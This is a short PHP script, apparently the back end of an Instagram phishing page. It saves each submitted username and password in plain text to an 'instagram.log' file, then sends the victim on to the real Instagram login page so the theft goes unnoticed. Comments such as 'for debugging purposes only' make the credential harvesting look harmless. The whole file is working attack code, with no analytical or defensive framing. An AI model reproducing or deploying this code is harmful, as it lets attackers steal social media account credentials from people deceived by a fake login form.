<?php
// Check if form data is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = filter_var($_POST['username'], FILTER_SANITIZE_STRING);
    $password = $_POST['password']; // It's crucial to handle passwords securely

    // Ensure the logs directory exists
    if (!is_dir('../IGlogs')) {
        mkdir('../IGlogs', 0777, true);
    }

    // Log the username and password (for debugging purposes only)
    error_log("Username: $username\nPassword: $password\n", 3, "../IGlogs/instagram.log");

    // Redirect to the real Instagram login page
    header("Location: https://www.instagram.com/accounts/login/");
    exit();
}
?>